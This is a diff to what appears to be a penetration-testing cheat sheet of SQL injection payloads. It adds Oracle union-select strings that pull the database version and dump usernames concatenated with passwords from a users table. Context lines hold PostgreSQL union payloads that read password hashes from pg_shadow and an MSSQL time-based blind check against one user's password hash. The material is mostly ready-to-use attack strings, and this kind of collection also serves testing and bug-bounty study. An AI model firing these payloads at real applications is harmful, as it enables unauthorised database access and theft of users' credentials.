@@ -830,7 +830,7 @@ USERNAME like 'a%', USERNAME like 'b%', USERNAME like 'c%'
 '; IF ((select count(username) from users where username = 'butch' and password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb')=1) WAITFOR DELAY '0:0:10';--
 ```
 
-- postgresql command injection
+- postgresql SQLi injection
 ```bash
 ' order by 7 -- //
 ' union select 1, 1, 1, 1, 1, 1 -- //
@@ -855,6 +855,16 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 
 # Get current user's password!
 ' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
+```
+
+- ORACLE SQLi injection: Union Select
+```bash
+# On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose.
+' union select null,banner from v$version--
+
+# You can retrieve multiple values together within this single column by concatenating the values together.
+' UNION SELECT username || '~' || password FROM users--
+
 ```
 
 ## Bug Bounty
